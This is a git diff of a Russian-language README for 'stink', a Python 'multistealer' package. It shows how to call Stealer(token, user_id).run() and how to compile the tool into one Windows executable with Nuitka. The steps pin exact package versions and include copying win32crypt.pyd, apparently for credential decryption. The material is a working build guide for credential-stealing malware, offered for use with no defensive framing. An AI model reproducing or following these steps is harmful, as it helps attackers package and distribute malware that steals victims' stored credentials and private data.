@@ -121,12 +121,12 @@ from stink.multistealer import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
+
 ### PyCharm
 1. Устанавливаем Nuitka и Stink:
 ```
 pip install Nuitka==0.6.16.4
 ```
-
 ```
 pip install stink==0.0.3
 ```
@@ -134,9 +134,9 @@ pip install stink==0.0.3
 ```python
 nuitka --onefile --include-package=stink test.py
 ```
+
 ### CMD
 1. Открываем `cmd`.
-
 2. Прописываем команду:
 ```
 pip install virtualenv
@@ -149,7 +149,6 @@ cd path\to\file
 ```
 virtualenv venv
 ```
-
 ```
 venv\Scripts\activate
 ```
@@ -157,12 +156,10 @@ venv\Scripts\activate
 ```
 pip install Nuitka==0.6.16.4
 ```
-
 ```
 pip install stink==0.0.3
 ```
 6. В появившейся папке venv переходим по пути `\Lib\site-packages\win32\`, копируем файл `win32crypt.pyd` и вставляем по пути `\Lib\site-packages\`.
-
 7. Возвращаемся к `cmd` и прописываем команду:
 ```
 nuitka --onefile --include-package=stink test.py
